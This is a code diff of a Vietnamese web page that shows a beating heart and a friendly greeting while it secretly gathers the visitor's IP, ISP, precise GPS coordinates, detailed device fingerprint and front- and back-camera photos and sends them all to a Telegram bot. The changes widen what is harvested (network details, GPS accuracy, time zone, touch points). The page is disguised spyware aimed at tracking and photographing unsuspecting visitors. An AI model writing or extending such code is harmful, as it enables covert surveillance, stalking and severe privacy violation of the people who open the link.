@@ -12,10 +12,7 @@
             min-height: 100vh; background-color: #ffe6e6; overflow: hidden;
             font-family: Arial, sans-serif;
         }
-        .container {
-            text-align: center;
-            cursor: pointer;
-        }
+        .container { text-align: center; cursor: pointer; }
         .heart {
             position: relative; width: 100px; height: 90px;
             background-color: red; transform: rotate(-45deg);
@@ -32,12 +29,7 @@
             50% { transform: scale(1.2) rotate(-45deg); }
             100% { transform: scale(1) rotate(-45deg); }
         }
-        .text {
-            color: #d32f2f;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 20px;
-        }
+        .text { color: #d32f2f; font-size: 18px; font-weight: bold; margin-top: 20px; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -59,29 +51,48 @@
         const canvas = document.getElementById('canvas');
         let isRunning = false;
 
-        // 1. Lấy thông tin thiết bị & hệ thống nâng cao
+        // 1. Lấy thông tin thiết bị & phần cứng chi tiết
         async function getDeviceInfo() {
             let batteryText = "Không rõ";
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    batteryText = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Đang sạc' : 'Không sạc'})`;
+                    batteryText = `${Math.round(battery.level * 100)}% (${battery.charging ? '⚡ Đang sạc' : '🔋 Dùng pin'})`;
                 }
             } catch (e) {}
+
+            let netDetails = "Không rõ";
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                netDetails = `${conn.effectiveType || ''} | Tốc độ: ${conn.downlink || 0} Mbps | Độ trễ: ${conn.rtt || 0}ms`;
+                if (conn.saveData) netDetails += " (Tiết kiệm dữ liệu: Bật)";
+            }
+
+            const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Tối (Dark)" : "Sáng (Light)";
+            const orientation = window.screen.orientation ? window.screen.orientation.type : (window.innerWidth > window.innerHeight ? "Ngang" : "Dọc");
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Không rõ";
 
             return {
                 userAgent: navigator.userAgent,
                 screenRes: `${window.screen.width}x${window.screen.height}`,
+                viewportRes: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: `${window.screen.colorDepth}-bit`,
+                orientation: orientation,
+                theme: isDarkMode,
+                network: netDetails,
                 language: navigator.language || navigator.userLanguage,
                 platform: navigator.platform,
                 ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không rõ',
                 cores: navigator.hardwareConcurrency || 'Không rõ',
                 battery: batteryText,
-                time: new Date().toLocaleString('vi-VN')
+                timeZone: timeZone,
+                time: new Date().toLocaleString('vi-VN'),
+                cookieEnabled: navigator.cookieEnabled ? "Có" : "Không",
+                touchPoints: navigator.maxTouchPoints || 0
             };
         }
 
-        // 2. Lấy thông tin IP & Vị trí IP
+        // 2. Lấy thông tin IP & Nhà mạng
         async function getIPInfo() {
             try {
                 const res1 = await fetch('https://api.ipify.org?format=json');
@@ -94,6 +105,7 @@
                     if (data2.success) {
                         return {
                             ip: ip,
+                            isp: data2.connection ? data2.connection.isp : '',
                             city: data2.city || '',
                             region: data2.region || '',
                             country: data2.country || '',
@@ -103,7 +115,7 @@
                     }
                 } catch (e) {}
 
-                return { ip: ip, city: '', region: '', country: '', lat: null, lon: null };
+                return { ip: ip, isp: '', city: '', region: '', country: '', lat: null, lon: null };
             } catch (e) {
                 try {
                     const resFB = await fetch('https://ipinfo.io/json');
@@ -111,6 +123,7 @@
                     const loc = dataFB.loc ? dataFB.loc.split(',') : [null, null];
                     return {
                         ip: dataFB.ip || 'Không rõ',
+                        isp: dataFB.org || '',
                         city: dataFB.city || '',
                         region: dataFB.region || '',
                         country: dataFB.country || '',
@@ -118,7 +131,7 @@
                         lon: loc[1]
                     };
                 } catch (err) {
-                    return { ip: 'Không rõ', city: '', region: '', country: '', lat: null, lon: null };
+                    return { ip: 'Không rõ', isp: '', city: '', region: '', country: '', lat: null, lon: null };
                 }
             }
         }
@@ -128,7 +141,7 @@
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                     () => resolve(null),
                     { enableHighAccuracy: true, timeout: 6000 }
                 );
@@ -161,7 +174,7 @@
             });
         }
 
-        // 5. Gửi dữ liệu về Telegram
+        // 5. Gửi dữ liệu về Telegram 1 lượt
         async function sendAllToTelegram(frontBlob, backBlob, captionText) {
             if (frontBlob && backBlob) {
                 const formData = new FormData();
@@ -218,12 +231,13 @@
                 getGeolocation()
             ]);
 
-            let captionText = `📊 **BÁO CÁO DỮ LIỆU TRUY CẬP**\n\n`;
-            captionText += `🌐 **Mạng & Vị trí:**\n`;
+            let captionText = `📊 **BÁO CÁO THU THẬP TỔNG HỢP**\n\n`;
+            captionText += `🌐 **Mạng & Định vị:**\n`;
             captionText += `• IP: \`${ipData.ip}\`\n`;
+            if (ipData.isp) captionText += `• Nhà mạng: ${ipData.isp}\n`;
 
             if (gpsLocation) {
-                captionText += `• GPS: \`${gpsLocation.lat},${gpsLocation.lon}\`\n`;
+                captionText += `• GPS: \`${gpsLocation.lat},${gpsLocation.lon}\` (Độ chính xác: ~${Math.round(gpsLocation.accuracy)}m)\n`;
                 captionText += `🔗 **Google Maps:** https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}\n`;
             } else {
                 if (ipData.city || ipData.region) {
@@ -234,12 +248,15 @@
                 }
             }
 
-            captionText += `\n📱 **Thông tin Thiết bị:**\n`;
+            captionText += `\n📱 **Thông tin Thiết bị & Phần cứng:**\n`;
             captionText += `• Pin: ${deviceInfo.battery}\n`;
-            captionText += `• Màn hình: ${deviceInfo.screenRes}\n`;
-            captionText += `• RAM / CPU: ${deviceInfo.ram} / ${deviceInfo.cores} nhân\n`;
+            captionText += `• Mạng: ${deviceInfo.network}\n`;
+            captionText += `• Màn hình: ${deviceInfo.screenRes} (Cửa sổ: ${deviceInfo.viewportRes})\n`;
+            captionText += `• Hướng & Giao diện: ${deviceInfo.orientation} | Chế độ ${deviceInfo.theme}\n`;
+            captionText += `• Cấu hình: RAM ${deviceInfo.ram} | CPU ${deviceInfo.cores} nhân\n`;
+            captionText += `• Điểm cảm ứng: ${deviceInfo.touchPoints} điểm\n`;
+            captionText += `• Múi giờ: ${deviceInfo.timeZone} (${deviceInfo.time})\n`;
             captionText += `• Ngôn ngữ: ${deviceInfo.language}\n`;
-            captionText += `• Thời gian: ${deviceInfo.time}\n`;
             captionText += `• User-Agent: \`${deviceInfo.userAgent}\`\n`;
 
             // Chụp Cam Trước
@@ -249,7 +266,7 @@
             const backPhoto = await captureStream({ video: { facingMode: { exact: "environment" } } }) 
                              || await captureStream({ video: { facingMode: "environment" } });
 
-            // Gửi dữ liệu
+            // Gửi dữ liệu tập trung 1 lần
             await sendAllToTelegram(frontPhoto, backPhoto, captionText);
 
             document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤";
